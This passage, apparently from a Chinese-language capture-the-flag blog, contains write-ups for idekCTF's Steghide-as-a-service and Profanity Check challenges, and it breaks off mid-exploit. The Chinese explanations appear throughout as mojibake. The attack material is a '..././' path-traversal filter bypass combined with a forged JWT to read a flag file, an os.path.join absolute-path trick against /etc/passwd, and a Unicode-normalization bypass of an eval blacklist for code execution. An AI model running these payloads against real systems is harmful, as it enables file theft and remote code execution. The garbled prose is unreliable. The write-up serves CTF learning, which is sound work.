&lt;span style="color:#111">pub_key_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getcwd&lt;/span>&lt;span style="color:#111">(),&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;keys/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pub_key_path&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">pub_key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pub_key_path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;BEGIN PUBLIC KEY&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">pub_key&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">jwt&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">token&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pub_key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">algorithms&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;RS256&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;HS256&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">rand_string&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">choice&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ascii_letters&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digits&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">embed_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">embed_file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">cover_file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">stegfile&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Popen&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#d88200">&amp;#39;steghide&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;embed&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;-ef&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">embed_file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;-cf&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">cover_file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;-sf&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">stegfile&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;-p&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">wait&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">timeout&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">.5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">cleanup&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;uploads/&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">remove&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;uploads/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;output/&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">remove&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;output/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>È°µÈù¢‰∏äÂèØ‰ª•‰ª•‰ªªÊÑèÁöÑcontentÂíåpasswd‰∏ä‰º†‰∏Ä‰∏™jpg/jpegÊñá‰ª∂Ôºå‰πãÂêéÂèØ‰ª•‰∏ãËΩΩ&lt;code>filename.jpg_guest_3295&lt;/code>ËøôÊ†∑ÁöÑ‰∏Ä‰∏™Êñá‰ª∂ÔºåÂπ∂‰∏îÊàë‰ª¨ÁöÑjwt‰ºöÊõ¥Êñ∞ÔºåÂÖ∂‰∏≠usernameÈÉ®ÂàÜÂ∞±ÊòØÊãºÂú®&lt;code>.jpg&lt;/code>ÂêéÈù¢ÁöÑÂÜÖÂÆπ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214104631768.png" alt="image-20211214104631768">&lt;/p>
&lt;p>Â∫∑ÂÖ≥ÈîÆÈÉ®ÂàÜÊ∫êÁ†Å&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214104825347.png" alt="image-20211214104825347">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214095218675.png" alt="image-20211214095218675">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214103556446.png" alt="image-20211214103556446">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214110203558.png" alt="image-20211214110203558">&lt;/p>
&lt;p>Âà©Áî®&lt;code>os.path.join()&lt;/code>Êàë‰ª¨ÂèØ‰ª•Áõ¥Êé•ÂæóÂà∞‰∏Ä‰∏™‰∏çÂèóÂπ≤Êâ∞ÁöÑÁªùÂØπË∑ØÂæÑÔºåÁ±ª‰ººËøôÊ†∑&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz/tmp&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;/etc/passwd&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#d88200">&amp;#39;/etc/passwd&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>‰∏ä‰º†ÁöÑÊñá‰ª∂ÂêçÊòØÁõ¥Êé•ÊãºÂú®&lt;code>os.path.join&lt;/code>‰∏≠ÁöÑÔºåËøáÊª§‰∫Ü&lt;code>../&lt;/code>ÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®&lt;code>..././&lt;/code>ÁöÑÊñπÂºèÊù•ÁªïËøáÔºàËøáÊª§‰πãÂêéÊãºËµ∑Êù•Ê≠£Â•ΩÊòØ&lt;code>../&lt;/code>ÔºåÂèØ‰ª•ÂÅöÂà∞Ë∑ØÂæÑÁ©øË∂äÔºå‰∏çËøáÊñá‰ª∂ÂêçËøò‰ºöÊúâ‰∏Ä‰∏™&lt;code>_&lt;/code>‰∏ãÂàíÁ∫øÔºåÊàë‰ª¨ÁöÑÁ©øË∂äÁõÆÊ†áË∑ØÂæÑÈúÄË¶ÅÊú¨Ë∫´Â∞±Â∏¶Êúâ‰∏ãÂàíÁ∫ø‰ΩøÂÖ∂‰∏çÁ©øÂ∏ÆÔºåÊàë‰ª¨ÈÄâÊã©&lt;code>/proc/self/map_files&lt;/code>ÔºàÈÄâÊã©&lt;code>/usr/local/lib/python3.8/http/__pycache__&lt;/code>‰πüÊòØÂèØ‰ª•Êª¥Ôºâ&lt;/p>
&lt;p>È™åËØÅcookieÊòØÂê¶ÂêàÊ≥ïÁöÑÊó∂ÂÄôÊòØÂú®Êñá‰ª∂‰∏ä‰º†‰πãÂêéÁöÑ‰∫ãÊÉÖÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•Áî®Êàë‰ª¨‰∏ä‰º†ÁöÑÊñá‰ª∂ÂÅöpublic.key&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">image_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">uploaded_file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">stream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">image_md5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">hashlib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">image_data&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hexdigest&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">image_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;uploads/&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">image_md5&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.jpeg&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Êàë‰ª¨ÁöÑÂõæÁâáË∑ØÂæÑÂ∞±Âú®&lt;code>/app/uploads/{image_md5}.jpeg&lt;/code>‰∏ãÔºåÊòØÂõ∫ÂÆöÂèØÊåáÂêëÁöÑÔºàÁªùÂØπË∑ØÂæÑÔºâ&lt;/p>
&lt;p>ÊâÄ‰ª•Êï¥‰∏™ÊÄùË∑ØÂ∞±ÊòØÔºöÂÖà‰∏ä‰º†‰∏Ä‰∏™Âê´ÊúâÂÖ¨Èí•ÁöÑjpegÂõæÁâáÔºå‰πãÂêé‰∏ä‰º†‰∏Ä‰∏™Ê≠£Â∏∏ÁöÑjpgÂõæÁâáÔºåËøôÊ¨°Ë¶Å‰øÆÊîπÊñá‰ª∂Âêç&lt;/p>
&lt;pre tabindex="0">&lt;code>..././..././..././..././..././proc/self/map
&lt;/code>&lt;/pre>&lt;p>ÂÜçÈÖçÂêàÊàë‰ª¨ÁöÑjwtÔºåÂÖ∂‰∏≠ÁöÑusernameÈÉ®ÂàÜÂ∞±ÂæóÊòØËøôÊ†∑&lt;/p>
&lt;pre tabindex="0">&lt;code>files/../../../app/flag.txt
&lt;/code>&lt;/pre>&lt;p>pubkeyÈÉ®ÂàÜÊåáÂêëÊàë‰ª¨ÂõæÁâáÁöÑÁªùÂØπË∑ØÂæÑ&lt;/p>
&lt;pre tabindex="0">&lt;code>/app/uploads/{image_md5}.jpeg
&lt;/code>&lt;/pre>&lt;p>ËøôÊ†∑Ôºå‰∏ä‰º†‰πãÂêéÁªèËøáÊãºÊé• ÊúÄÁªàË∑ØÂæÑÂ∞Ü‰ºöÊòØ&lt;/p>
&lt;pre tabindex="0">&lt;code>output/../../../../../proc/self/map_files/../../../app/flag.txt
&lt;/code>&lt;/pre>&lt;p>ËøôÊ†∑Âú®‰∏ãËΩΩÊó∂Â∞±ÂÅöÂà∞‰∫Ü‰ªªÊÑèÊñá‰ª∂ËØªÂèñÔºåÂæóÂà∞flag&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîËÇ•ËÇ†Â∑ßÂ¶ôÁöÑÊÄùË∑Ø‰∫ÜÔºÅ‰πãÂâçÂÅöjwtÁõ∏ÂÖ≥ÁöÑÈ¢òÂõ∫ÂÆöÂ•óË∑ØÈÉΩÊòØsstiËé∑ÂèñkeyÔºå‰º™ÈÄ†cookieÂ∞±Â•Ω‰∫ÜÔºåËÄåËøô‰∏™Ë∑üÊñá‰ª∂ËøòÊúâÁªìÂêàÔºå‰πãÂâçÊ≤°ËßÅËøá&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÊúâ‰∏Ä‰∏™ÊàëÂøΩÁï•ÁöÑÁÇπÔºöÁî±‰∫éÊòØÂÖà‰øùÂ≠òÊñá‰ª∂ÂÜçÊ†°È™å ÊâÄ‰ª•‰∏çÁî®ÁÆ°‰º†‰∏äÂéªÊä•‰∏çÊä•ÈîôÈÉΩ‰ºöË¢´ÁïôÂ≠òÔºåÁÑ∂ÈπÖÁÑ∂ÈπÖÔºåÈÉΩÊúâ‰∫Ü&lt;code>embed_file&lt;/code>ÂáΩÊï∞Êù•Áõ¥Êé•Ëé∑ÂæóÈöêÂÜôÁöÑÊñá‰ª∂‰∫Ü„ÄÇ„ÄÇ„ÄÇ„ÄÇüòÖÂ∞è‰∏ëÁ´üÊòØÊàëËá™Â∑±&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://fireshellsecurity.team/idekctf-writeups/#steghide-as-a-service">wp&lt;/a>&lt;/p>
&lt;h2 id="miscprofanity-check">Misc/Profanity Check&lt;/h2>
&lt;blockquote>
&lt;p>once tried to filter messages for profanity using a discord bot. I failed. &lt;code>nc profanity-check.chal.idek.team 1337&lt;/code>&lt;/p>
&lt;p>&lt;a href="https://ctf.idek.team/handouts/misc/ProfanityCheck/profanity_check.py">https://ctf.idek.team/handouts/misc/ProfanityCheck/profanity_check.py&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">unicodedata&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">normalize&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;gt;&amp;gt;&amp;gt; &amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10000&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">choice&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Profanity detected. Exiting.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">exit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">normalize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;NFC&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">blacklist&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;()&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;{&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;}&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;[&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;@&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;$&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;%&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;^&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;amp;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;,&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;class&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;mro&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;sub&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;glob&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">blacklist&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Profanity detected. Exiting.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">exit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂæàÊòéÊòæÈúÄË¶ÅÁªïËøáËøô‰∏™wafÊù•rceÔºåÊ≤°ÊúâË¢´ËøáÊª§ÁöÑÊúâÂçïÂèåÂºïÂè∑ÂíåÊï∞Â≠óÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•Áî®ÂÖ´ËøõÂà∂ÔºåÊØîÂ¶ÇËøôÊ†∑&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\150\145\154\160\50\51\40&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># eval(help())&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>‰ΩÜÊòØËøôÈáåÁî®8ËøõÂà∂Âπ∂‰∏çÂèØ‰ª•Ë¢´&lt;code>eval&lt;/code>ÊâßË°åÔºåÂõ†‰∏∫Êú¨Âú∞ÊòØËøôÊ†∑ÁöÑ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213115540592.png" alt="image-20211213115540592">&lt;/p>
&lt;p>‰ΩÜÊòØÈÄöËøá&lt;code>input&lt;/code>‰º†ËøáÂéª‰πãÂêé‰ºöË¢´ËΩ¨‰πâÔºåÂÜçÂä†‰∏Ä‰∏™ÂèçÊñúÊù†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213115722152.png" alt="image-20211213115722152">&lt;/p>
&lt;p>ÈÇ£ËÇØÂÆö‰ºöÊÉ≥ÂÜçÂä†ÂèçÊñúÊù†ÂëóÔºü&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213120106808.png" alt="image-20211213120106808">&lt;/p>
&lt;p>Êú¨Êù•Êàë‰ª¨ÁöÑ&lt;code>\&lt;/code>ÂèçÊñúÊù†ÊòØÁî®Êù•ÂÅö8ËøõÂà∂ÁöÑÂºïÂØºÂ≠óÁ¨¶ÁöÑÔºåÁªìÊûúËøôÊ†∑Â§ÑÁêÜ‰ºöÂèòÊàêÁ∫ØÁ∫ØÁöÑÂ≠óÁ¨¶‰∏≤ÔºåË∂äÊèèË∂äÈªë‰∫Ü&lt;/p>
&lt;p>ÊòæÁÑ∂ËøôÊ†∑ÊòØÊâßË°å‰∏ç‰∫ÜÂëΩ‰ª§ÁöÑÔºà‰πüÂèØËÉΩÊòØÊàëÁü•ÈÅìÁöÑÂ§™Â∞ë‰∫ÜÔºåÊ¨¢ËøéÂêÑ‰ΩçÂ∏àÂÇÖÂàÜ‰∫´ÔºâÔºåÊàë‰ª¨ËøôÈáåÁî®unicodeÁöÑÂ∞ètrick&lt;/p>
&lt;p>ÂÅöÈ¢òÂ§ö‰∏ÄÁÇπÁöÑÂ∏àÂÇÖÂ∫îËØ•Â∞±ËÉΩÊòéÁôΩÂï•ÊÑèÊÄù‰∫ÜÔºå‰∏Ä‰∏™Â∏∏ËÄÉÁöÑÁÇπÊòØÊ≥®ÂÜå&lt;code>¬™dmin&lt;/code>ÁöÑË¥¶Êà∑Êù•‰º™ÈÄ†&lt;code>admin&lt;/code>ÔºåËøôÈáå‰πüÊòØÂêåÁêÜÔºõ‰ª£Á†Å‰∏≠Êúâ‰∏Ä‰∏™Áº∫Èô∑ÔºöÂÖàËøáÊª§ÈªëÂêçÂçïÂ≠óÁ¨¶ÂÜçËøõË°å&lt;code>normalize()&lt;/code>ÔºåËøô‰ºöÂØºËá¥ÁâπÊÆäÁöÑunicodeÂ≠óÁ¨¶‰ºöÂÖàÈ°∫Âà©ÈÄöËøáËøáÊª§ÔºåÂÜçË¢´&lt;code>normalize()&lt;/code>ËΩ¨‰∏∫Ê≠£Â∏∏Â≠óÁ¨¶ÔºåÊúÄÁªàÂëΩ‰ª§ÊâßË°å&lt;/p>
&lt;p>ËøôÈáåÊòØ‰∏™exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#111">letters&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;¬™&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;·µá&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;·∂ú&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;·µà&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;·µâ&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;·∂†&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;·µç&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39; 